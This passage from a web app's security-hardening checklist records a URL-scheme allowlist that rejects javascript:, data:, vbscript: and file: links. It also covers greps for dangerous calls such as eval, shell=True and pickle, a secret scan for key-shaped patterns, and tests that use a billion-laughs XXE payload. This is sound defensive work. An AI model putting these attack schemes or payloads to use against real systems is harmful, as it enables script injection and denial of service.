      `HOST=0.0.0.0` alone (debug off, the existing Phase 2 behavior) both
      still start and serve normally.
- [x] **Added a scheme allowlist on the roll-call vote citation link**
      (`static/app.js`, the sole remaining `href=""` sink in the file). A
      new `safeHref()` helper accepts only `http:`/`https:` URLs — parsed
      with NO base argument, deliberately, after catching a real bug in an
      earlier draft: resolving against `window.location.href` silently
      turned an empty/malformed value into a same-origin URL instead of
      rejecting it (an empty citation URL would have rendered as a link to
      the *current page* rather than no link at all — worth noting as a
      reminder that even a "cheap insurance" fix needs the same
      verification rigor as anything else). Not currently exploitable
      (`votes.py` only ever emits fixed `clerk.house.gov`/`senate.gov`
      URLs) but closes the latent `javascript:`-href path should citation
      URLs ever become data-derived. Verified against real
      `clerk.house.gov`/`senate.gov` URLs (preserved), `javascript:`/
      `data:`/`vbscript:`/`file:` payloads (rejected), and
      empty/null/undefined/garbage input (rejected, not silently resolved)
      — plus a live headless-browser pass confirming the votes panel still
      renders real, clickable citation links from demo data.
- [x] **Final pass — re-read "Areas Reviewed — No Findings" against every
      change across all four phases, not just Phase 4's own diff:**
      - *Command/code injection* — still CLEAR. Grepped all shipped files
        (excluding `tests/`, which legitimately uses `subprocess.run` with
        fixed, non-interpolated commands for real end-to-end verification —
        see Phase 2/3/4's test files) for `subprocess`/`os.system`/`eval`/
        `exec`/`shell=True`/`pickle`/`yaml.load`: zero hits.
      - *Directory traversal* — still CLEAR. No new file writes driven by
        request data anywhere in this work; `.env`/`run.sh` changes are
        operator-side shell setup, not a web-request code path.
      - *Client-side XSS* — still CLEAR, and its one noted caveat
        ("missing CSP" as a control gap) is now RESOLVED by Phase 3. Every
        `innerHTML` sink was re-walked after all four phases' edits: the
        Phase 3 swatch-color refactor REMOVED dynamic interpolation from
        those sinks entirely (hardcoded class names now, vs. a JS color
        variable before — strictly less surface, not more), and the new
        `safeHref()` citation link still routes through the pre-existing
        `escapeHtml()` before landing in the `href=""` attribute — no new
        unescaped sink introduced anywhere.
      - *API key leakage* — still CLEAR. Every `print()` added across all
        four phases (bind warnings, the debug-refusal message, mode
        banners) is static text; none interpolate an actual key/secret
        value.
      - *Job ID predictability* — untouched, still `uuid.uuid4().hex`.
      - *Secrets in git history* — still CLEAR. Diffed every file changed
        across all four phases' commits against key-shaped/high-entropy
        patterns (`FEC_API_KEY=`, `CONGRESS_API_KEY=`, `sk-ant-`, PEM
        headers, etc.): zero hits: `.env` itself was never committed (only
        the empty-valued `.env.example` template, which
        `tests/test_run_sh_env.py` asserts stays empty), and `run.sh` no
        longer carries key values at all (Phase 2).
      - Also specifically checked the two examples this item named: the
        Phase 2 `candidate_id`/`state` regexes (`^[HSP][0-9A-Z]{8}$`,
        `^[A-Z]{2}$`) are simple, fully-anchored, fixed-character-class
        patterns with no nested quantifiers and no injection surface of
        their own (no ReDoS, no dynamic pattern construction); the Phase 3
        CSP work didn't add any inline `<script>`/`<style>` or new
        `innerHTML` call.
- [x] **Regression tests for this phase** — `tests/test_xxe_guard.py` (a
      real billion-laughs payload proven to expand under stdlib
      `ElementTree` and rejected under `defusedxml`; both attack shapes
      against votes.py's actual wrapper functions; real fixture XML
      re-verified), `tests/test_debug_bind_coupling.py` (real subprocess
      launches proving the refuse-to-start case never binds the port while
      both individually-safe configurations still serve normally; `/health`
      response shape), `tests/test_citation_link_scheme.mjs` (Node,
      `safeHref` against real citation URLs, four dangerous schemes, and
      four "should safely reject, not silently resolve" edge cases — the
      exact class of bug caught in an earlier draft of this fix). Full
      existing suite (Python + Node) re-run clean throughout, including
      live browser/subprocess verification consistent with Phases 1–3
      (headless Chromium confirming the votes panel still renders real
      citation links; direct `python3 app.py` launches for the bind/debug
      coupling and `/health` behavior).
